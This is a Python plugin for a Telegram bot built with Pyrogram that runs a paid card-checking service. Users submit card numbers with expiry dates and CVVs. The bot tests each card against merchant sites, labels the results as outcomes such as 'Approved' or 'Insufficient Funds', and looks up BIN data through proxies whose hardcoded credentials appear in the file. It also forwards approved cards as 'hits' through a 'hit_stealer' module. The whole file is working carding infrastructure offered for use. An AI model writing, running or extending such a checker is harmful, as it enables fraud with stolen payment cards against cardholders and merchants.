from pyrogram import Client, filters
from pyrogram.enums import ChatType
from pyrogram.types import Message
from plugins.func.users_sql import fetchinfo, get_all_custom_gates, updatedata, plan_expirychk
from plugins.gates.auto import check_and_add_site
from plugins.tools.hit_stealer import send_hit_if_approved
import re, time, httpx
from httpx import AsyncHTTPTransport
from datetime import datetime

@Client.on_message(filters.text & (filters.private | filters.group), group=99)
async def handle_dynamic_commands(client, message: Message):
    if not message.from_user:
        return

    user_id = str(message.from_user.id)
    text = message.text.strip()

    if not (text.startswith("/") or text.startswith(".")):
        return

    command_raw = text.split(" ", 1)[0][1:].lower()
    gates = get_all_custom_gates(user_id)
    gate = next((g for g in gates if g[0].lower() == command_raw), None)
    if not gate:
        return

    regdata = fetchinfo(user_id)
    if not regdata:
        return await message.reply("❌ You are not registered. Use /register")

    if message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
        with open("plugins/group.txt") as f:
            allowed_groups = f.read().splitlines()
        if str(message.chat.id) not in allowed_groups:
            return await message.reply("❌ Unauthorized group.")

    role = regdata[2].upper() if regdata[2] else "FREE"
    credit = int(regdata[5] or 0)
    wait_time = int(regdata[6] or 15)
    antispam_time = int(regdata[7] or 0)
    now = int(time.time())
    today = datetime.utcnow().strftime("%Y-%m-%d")
    daily_count = int(regdata[11] or 0)
    last_check_date = regdata[12] or ""

    if last_check_date != today:
        daily_count = 0
        updatedata(user_id, "daily_check_count", 0)
        updatedata(user_id, "last_check_date", today)

    if role == "FREE":
        if message.chat.type == ChatType.PRIVATE:
            return await message.reply("❌ This gate is only available to Premium users in private chat.")
        if daily_count >= 75:
            return await message.reply("❌ Daily limit reached (75 checks). Try again tomorrow.")

    if now - antispam_time < wait_time:
        return await message.reply(f"⏳ Wait {wait_time - (now - antispam_time)}s")

    if role != "FREE" and credit < 1:
        return await message.reply("❌ You have no credits.")

    cc_raw = message.reply_to_message.text if message.reply_to_message else (
        text.split(" ", 1)[1] if len(text.split()) > 1 else None
    )
    if not cc_raw:
        return await message.reply(f"❌ No card found.\nUsage: /{command_raw} cc|mm|yy|cvv")

    match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_raw)
    if not match:
        return await message.reply("❌ Invalid format. Use cc|mm|yy|cvv")

    ccnum, mes, ano, cvv = match.groups()
    cc = f"{ccnum}|{mes}|{ano}|{cvv}"

    site_url, gate_name, shipping = gate[1], gate[2], gate[3]
    gate_label = gate_name.replace("$", "") if gate_name else "Unnamed"

    checking_msg = await message.reply(f"""<code>┏━━━━━━━⍟</code>
<b>┃  {gate_label}</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{cc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...""")

    tic = time.perf_counter()
    success, result_msg, raw_data = await check_and_add_site(cc, site_url, email=None, shipping=shipping == "True")
    toc = time.perf_counter()

    updatedata(user_id, "antispam_time", now)
    if role == "FREE":
        updatedata(user_id, "daily_check_count", daily_count + 1)
        updatedata(user_id, "last_check_date", today)
    else:
        updatedata(user_id, "credits", credit - 1)
    plan_expirychk(user_id)

    # BIN lookup with proxy and retry
    brand = type_ = level = bank = country = "N/A"
    flag = "🏳️"
    bin_code = ccnum[:6]

    proxies = [
        "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000",
        "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000",
        "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
    ]

    for proxy in proxies:
        try:
            transport = AsyncHTTPTransport(proxy=proxy)
            async with httpx.AsyncClient(transport=transport, timeout=10) as bin_client:
                r = await bin_client.get(f"https://api.voidex.dev/api/bin?bin={bin_code}")
                if r.status_code == 200:
                    b = r.json()
                    brand = str(b.get("brand") or b.get("scheme") or "N/A").upper()
                    type_ = str(b.get("type", "N/A")).upper()
                    level = str(b.get("level", "N/A")).upper()
                    bank = str(b.get("bank", "N/A")).upper()
                    country = str(b.get("country_name", "N/A")).upper()
                    flag = b.get("country_flag", "🏳️")
                    break
        except:
            continue

    msg = result_msg.lower()
    if any(x in msg for x in ["charged", "processedreceipt"]):
        status = "Approved ✅"
    elif "zip" in msg:
        status = "Incorrect Zip ✅"
    elif "cvc" in msg or "cvv" in msg:
        status = "Incorrect CVC ✅"
    elif "insufficient" in msg:
        status = "Insufficient Funds ✅"
    elif "avs" in msg:
        status = "AVS Match ✅"
    else:
        status = "Declined ❌"

    final_msg = f"""<code>┏━━━━━━━⍟</code>
<b>┃  {gate_label}</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{cc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {result_msg}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>"""

    try:
        if checking_msg.text != final_msg:
            await checking_msg.edit(final_msg)
    except Exception as e:
        if "MESSAGE_NOT_MODIFIED" not in str(e):
            await message.reply(f"❌ Edit error: {e}")

    if "charged" in msg or "processedreceipt" in msg:
        await send_hit_if_approved(client, final_msg)
